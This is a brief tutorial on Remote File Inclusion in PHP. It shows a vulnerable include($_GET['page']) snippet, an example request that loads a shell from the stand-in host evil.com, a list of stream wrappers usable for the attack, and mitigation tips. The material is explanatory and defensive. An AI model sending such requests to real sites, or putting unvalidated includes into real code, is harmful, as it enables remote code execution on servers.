### **🌐 What is RFI (Remote File Inclusion)?**

**RFI** is a vulnerability that allows an attacker to include and execute **remote code** (typically from a malicious server) in a vulnerable PHP application.

It happens when user input is used in an `include()` or `require()` statement **without validation**.

### **🧨 Example:**

```php
<?php include($_GET['page']); ?>
```

A malicious request:

```
?page=http://evil.com/shell.txt
```

If `allow_url_include = On`, the PHP interpreter fetches and executes the remote code.

### **🔌 Useful Wrappers in RFI**

- **`http://` or `https://`** – Load remote code via HTTP/S
- **`data://`** – Embed code inline (base64 or plain text)
- **`ftp://`** – Include files from FTP servers
- **`php://input`** – Sometimes used in POST-based RFI-like behaviors

---

### ⚠️ **Mitigation Tips**

- **Disable `allow_url_include`** (it's off by default in modern PHP).
- Sanitize and whitelist user inputs.
- Avoid using `include()`/`require()` with user-controlled input.
